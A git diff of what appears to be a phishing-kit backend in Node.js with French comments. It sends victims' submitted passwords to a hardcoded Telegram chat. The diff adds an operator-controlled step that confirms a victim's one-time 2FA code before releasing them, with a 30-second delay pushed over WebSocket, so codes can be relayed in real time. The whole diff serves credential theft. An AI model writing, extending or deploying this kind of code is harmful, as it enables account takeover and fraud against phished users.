@@ -19,6 +19,7 @@ const TELEGRAM_CHAT_ID = '6276768700';
 // Store pour gérer les codes et connexions WebSocket
 const codeStore = {
     currentCode: null,
+    isVerified: false,
     clients: []
 };
 
@@ -96,7 +97,7 @@ app.post('/api/login', async (req, res) => {
 🔑 <b>Mot de passe:</b> <code>${password}</code>
 ⏰ <b>Heure:</b> ${timestamp}
 
-─────────────────────────────────────────
+────────────────────────────────────────
 `;
 
         // Envoyer le message à Telegram
@@ -139,6 +140,9 @@ app.post('/api/submit-code', (req, res) => {
             });
         }
 
+        // Réinitialiser le statut de vérification
+        codeStore.isVerified = false;
+
         // Stocker le code
         codeStore.currentCode = code;
         console.log('📝 Code reçu:', code);
@@ -174,6 +178,64 @@ app.post('/api/submit-code', (req, res) => {
     }
 });
 
+// Route pour confirmer le code (depuis admin après 30 secondes)
+app.post('/api/confirm-code', (req, res) => {
+    try {
+        const { code } = req.body;
+
+        if (!code) {
+            return res.status(400).json({
+                success: false,
+                message: 'Code requis'
+            });
+        }
+
+        if (code === codeStore.currentCode) {
+            console.log('✅ Code confirmé avec succès!');
+            
+            // Marquer comme vérifié
+            codeStore.isVerified = true;
+
+            // Envoyer la confirmation à tous les clients après 30 secondes
+            setTimeout(() => {
+                const confirmMessage = JSON.stringify({
+                    type: 'confirmed',
+                    code: code,
+                    timestamp: new Date().toISOString()
+                });
+
+                codeStore.clients.forEach(client => {
+                    if (client.readyState === WebSocket.OPEN) {
+                        client.send(confirmMessage);
+                        console.log('✅ Confirmation envoyée au client');
+                    }
+                });
+            }, 30000); // 30 secondes
+
+            res.json({
+                success: true,
+                message: 'Code confirmé! La confirmation sera envoyée dans 30 secondes.',
+                code: code
+            });
+        } else {
+            console.log('❌ Code incorrect:', code, 'vs', codeStore.currentCode);
+            res.status(400).json({
+                success: false,
+                message: 'Code incorrect',
+                code: code
+            });
+        }
+
+    } catch (error) {
+        console.error('❌ Erreur:', error.message);
+        res.status(500).json({
+            success: false,
+            message: 'Erreur lors de la confirmation',
+            error: error.message
+        });
+    }
+});
+
 // Route pour vérifier le code
 app.post('/api/verify-code', (req, res) => {
     try {
@@ -186,7 +248,7 @@ app.post('/api/verify-code', (req, res) => {
             });
         }
 
-        if (code === codeStore.currentCode) {
+        if (code === codeStore.currentCode && codeStore.isVerified) {
             console.log('✅ Code vérifié avec succès!');
             res.json({
                 success: true,
@@ -194,10 +256,10 @@ app.post('/api/verify-code', (req, res) => {
                 code: code
             });
         } else {
-            console.log('❌ Code incorrect:', code, 'vs', codeStore.currentCode);
+            console.log('❌ Code incorrect ou non confirmé:', code, 'vs', codeStore.currentCode);
             res.status(400).json({
                 success: false,
-                message: 'Code incorrect',
+                message: 'Code incorrect ou pas encore confirmé',
                 code: code
             });
         }
@@ -220,6 +282,7 @@ app.get('/api/test', (req, res) => {
         chat_id: 'Configuré ✅',
         websocket: 'Actif ✅',
         currentCode: codeStore.currentCode || 'Aucun code',
+        isVerified: codeStore.isVerified,
         connectedClients: codeStore.clients.length
     });
 });
